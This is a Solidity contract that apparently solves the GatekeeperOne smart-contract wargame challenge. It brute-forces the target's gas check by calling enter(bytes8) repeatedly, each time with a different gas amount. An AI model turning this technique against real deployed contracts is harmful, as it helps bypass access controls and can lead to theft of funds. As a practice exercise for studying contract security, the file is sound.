// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    GatekeeperOne to;

    constructor(address _to) {
        to = GatekeeperOne(_to);
    }

    function enter(bytes8 _gateKey) public returns(bool) {
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(to).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                return true;
            }
        }
        return false;
    }
}